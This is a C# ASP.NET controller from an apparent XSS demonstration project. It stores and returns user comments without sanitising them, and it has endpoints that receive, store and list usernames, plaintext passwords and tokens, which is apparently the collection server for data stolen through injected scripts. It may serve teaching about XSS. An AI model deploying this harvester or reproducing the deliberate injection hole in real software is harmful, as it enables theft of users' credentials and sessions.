using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using XSS_Exemple.Data;
using XSS_Exemple.Models;

namespace XSS_Exemple.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class XSSController : ControllerBase
    {
        private readonly AppDbContext _context;
        public XSSController(AppDbContext context)
        {
            _context = context;
        }

        [HttpPost("AddComment")]
        public async Task<IActionResult> AddComment([FromBody] Comentario model)
        {
            try
            {
                Comentario c = new Comentario
                {
                    Texto = model.Texto
                };

                _context.Comentarios.Add(c);
                await _context.SaveChangesAsync();

                return Ok("Comentario adicionado!");
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }

        [HttpGet("GetComments")]
        public async Task<IActionResult> GetComments()
        {
            try
            {
                var comments = await _context.Comentarios.ToListAsync();

                return Ok(comments);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }

        [HttpPost("ReceberDadosLogin")]
        public async Task <IActionResult> ReceberDadosLogin(Login model)
        {
            try
            {
                Login newLogin = new Login
                {
                    Username = model.Username,
                    Password = model.Password
                };

                _context.Logins.Add(newLogin);
                await _context.SaveChangesAsync();

                return Ok("Login recebido");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }

        [HttpGet("RetornarLogins")]
        public async Task<IActionResult> RetornarDadosLogin()
        {
            try
            {
                var logins = await _context.Logins.ToListAsync();

                return Ok(logins);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }

        [HttpPost("ReceberDadosToken")]
        public async Task<IActionResult> ReceberDadosToken(Tokens model)
        {
            try
            {
                Tokens newToken = new Tokens
                {
                    Token = model.Token
                };

                _context.Tokens.Add(newToken);
                await _context.SaveChangesAsync();

                return Ok("Token recebido");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }

        [HttpGet("RetornarTokens")]
        public async Task<IActionResult> RetornarTokens()
        {
            try
            {
                var tokens = await _context.Tokens.ToListAsync();

                return Ok(tokens);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

            return BadRequest();
        }
    }
}
